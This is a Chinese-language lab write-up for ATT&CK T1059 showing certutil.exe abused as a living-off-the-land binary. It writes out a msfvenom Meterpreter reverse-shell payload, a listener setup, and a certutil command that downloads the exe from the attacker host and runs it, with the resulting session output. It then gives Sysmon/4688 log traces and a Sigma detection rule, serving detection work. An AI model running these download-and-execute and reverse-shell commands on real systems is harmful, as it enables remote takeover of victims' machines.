# T1059-win-基于白名单Certutil.exe执行Payload

## 来自ATT&CK的描述

暂无合适分类，置放在此TID中

命令行界面是与计算机系统交互的一种方式，并且是很多操作系统平台的常见特性。例如，Windows系统上的命令行界面cmd可用于执行许多任务，包括执行其他软件。命令行界面可在本地交互或者通过远程桌面应用、反向shell会话等远程交互。执行的命令以命令行界面进程的当前权限级别运行，除非该命令需要调用进程来更改权限上下文（例如，定时任务）。

攻击者可能会使用命令行界面与系统交互并在操作过程中执行其他软件。

## 测试案例

Certutil.exe是作为证书服务的一部分安装的命令行程序。 我们可以使用此工具在目标计算机上执行恶意EXE文件，并获取meterpreter会话。

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

## 检测日志

windows 安全日志/SYSMON日志（需要自行安装）

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：win7（sysmon）

### 攻击分析

#### 生成payload.exe

通过msfvenom 生成恶意可执行文件，并使用start multi/handler获取目标计算机反向shell会话。

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.126.146 lport=1234 -f exe > shell.exe
```

#### 执行监听

```bash
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.126.146
lhost => 192.168.126.146
msf5 exploit(multi/handler) > set lport 1234
lport => 1234
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.126.146:1234

```

#### 开启小型http服务

```bash
root@12306Br0:~# python2 -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

#### 靶机执行payload

```dos
certutil.exe -urlcache -split -f http://192.168.126.146:1234/shell.exe shell.exe & shell.exe
```

#### 反弹shell

```bash
[*] Started reverse TCP handler on 192.168.126.146:1234
[*] Sending stage (180291 bytes) to 192.168.126.149
[*] Sending stage (180291 bytes) to 192.168.126.149
[*] Meterpreter session 1 opened (192.168.126.146:1234 -> 192.168.126.149:49172) at 2020-04-17 15:59:50 +0800
```

## 测试留痕

```log
#sysmon日志
EventID: 1
Image: C:\Windows\System32\certutil.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: CertUtil.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
CommandLine: certutil.exe  -urlcache -split -f http://192.168.126.146:1234/shell.exe shell.exe

#win7安全日志
EventID：4688
进程信息:
新进程 ID:0xbcc
新进程名: C:\Windows\System32\certutil.exe

#windows server 2008(不含2008)以上系统可以配置审核进程创建策略，达到记录命令行参数的效果。通过命令行参数进行监控分析。
```

## 检测规则/思路

### sigma规则

```yml
title: 可疑的Certutil命令
status: experimental
description: 使用诸如“decode”子命令之类的子命令检测可疑的Microsoft certutil执行，该子命令有时用于使用内置的certutil实用程序
references:
    - https://twitter.com/JohnLaTwC/status/835149808817991680
    - https://twitter.com/subTee/status/888102593838362624
    - https://twitter.com/subTee/status/888071631528235010
    - https://blogs.technet.microsoft.com/pki/2006/11/30/basic-crl-checking-with-certutil/
    - https://www.trustedsec.com/2017/07/new-tool-release-nps_payload/
    - https://twitter.com/egre55/status/1087685529016193025
    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine:
            - '* -decode *'
            - '* /decode *'
            - '* -decodehex *'
            - '* /decodehex *'
            - '* -urlcache *'
            - '* /urlcache *'
            - '* -verifyctl *'
            - '* /verifyctl *'
            - '* -encode *'
            - '* /encode *'
            - '*certutil* -URL*'
            - '*certutil* /URL*'
            - '*certutil* -ping*'
            - '*certutil* /ping*'
    condition: selection
fields:
    - CommandLine
    - ParentCommandLine
tags:
    - attack.defense_evasion
    - attack.t1140
    - attack.t1105
    - attack.t1059
    - attack.s0189
    - attack.g0007
falsepositives:
    - False positives depend on scripts and administrative tools used in the monitored environment
level: high

```

### 建议

根据进程创建事件4688/1（进程名称、命令行）进行监控。本监控方法需要自行安装配置审核策略Sysmon。

## 参考推荐

MITRE-ATT&CK-T1059

<https://attack.mitre.org/techniques/T1059/>
